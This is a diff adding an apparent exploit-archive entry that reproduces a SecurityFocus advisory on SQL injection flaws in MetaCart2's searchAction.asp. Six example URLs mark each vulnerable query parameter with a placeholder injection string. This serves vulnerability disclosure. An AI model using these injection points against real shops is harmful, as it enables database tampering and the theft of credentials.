@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/13393/info
+
+MetaCart2 is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+An attacker may exploit these issues to manipulate SQL queries to the underlying database. This may facilitate the theft of sensitive information, potentially including authentication credentials, and data corruption. 
+
+http://www.example.com/mcart2sqluk/searchAction.asp?chkText='SQL_INJECTION&strText=dcrab&chkPrice=yes&intPrice=all&chkCat=yes&strCat=1
+http://www.example.com/mcart2sqluk/searchAction.asp?chkText=yes&strText='SQL_INJECTION&chkPrice=yes&intPrice=all&chkCat=yes&strCat=1
+http://www.example.com/mcart2sqluk/searchAction.asp?chkText=yes&strText=dcrab&chkPrice='SQL_INJECTION&intPrice=all&chkCat=yes&strCat=1
+http://www.example.com/mcart2sqluk/searchAction.asp?chkText=yes&strText=dcrab&chkPrice=yes&intPrice='SQL_INJECTION&chkCat=yes&strCat=1
+http://www.example.com/mcart2sqluk/searchAction.asp?chkText=yes&strText=dcrab&chkPrice=yes&intPrice=all&chkCat='SQL_INJECTION&strCat=1
+http://www.example.com/mcart2sqluk/searchAction.asp?chkText=yes&strText=dcrab&chkPrice=yes&intPrice=all&chkCat=yes&strCat='SQL_INJECTION 
